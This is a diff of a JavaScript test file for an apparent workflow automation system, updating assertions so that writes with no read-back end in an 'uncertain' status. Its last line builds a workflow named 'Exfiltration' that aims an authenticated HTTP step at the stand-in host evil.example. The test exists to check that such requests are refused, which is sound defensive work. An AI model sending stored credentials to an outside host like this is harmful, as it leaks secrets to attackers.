@@ -15,7 +15,7 @@ before(async () => {
 after(async () => { await h?.close() });
 const form = s => new URLSearchParams(s);
 
-test('HTTP-002: requests use stored connections, map responses, route business failures, read back lost writes and refuse other destinations', async () => {
+test('HTTP-002/EXEC-005: requests use stored connections, map responses, route business failures, read back lost writes and refuse other destinations', async () => {
   const token = fakeSecret('vendor'), records = { r1: { id: 'r1', status: 'new' } };
   let lose = false;
   fake.routes.set('api.vendor.example', ({ method, url, headers, body }) => {
@@ -57,7 +57,11 @@ test('HTTP-002: requests use stored connections, map responses, route business f
   assert.equal(patches(), before + 1);
   const blind = await publish(h, 'Blind patch', { trigger: { type: 'manual' }, steps: [{ ...patch, readback: undefined }] });
   const uncertain = await startRun(h, blind, { status: 'returned' });
-  assert.equal(uncertain.status, 'failed'); assert.equal(uncertain.error.category, 'uncertain'); assert.equal(patches(), before + 2, 'no automatic retry after an uncertain write');
+  assert.equal(uncertain.status, 'uncertain');
+  assert.equal(uncertain.attempts.length, 1); assert.equal(uncertain.attempts[0].error_category, 'network');
+  const uncertainHistory = await h.get('workflow-runs?workflow=' + blind.id + '&status=uncertain');
+  assert.deepEqual(uncertainHistory.runs.map(r => r.id), [uncertain.id]);
+  assert.equal((await h.get('workflow-runs?workflow=' + blind.id + '&status=failed')).runs.length, 0); assert.equal(uncertain.error.category, 'uncertain'); assert.equal(patches(), before + 2, 'no automatic retry after an uncertain write');
   lose = false;
 
   const elsewhere = await publish(h, 'Exfiltration', { trigger: { type: 'manual' }, steps: [{ id: 'leak', type: 'http', connection_id: vendor.id, input: { url: 'https://evil.example/collect' } }] });
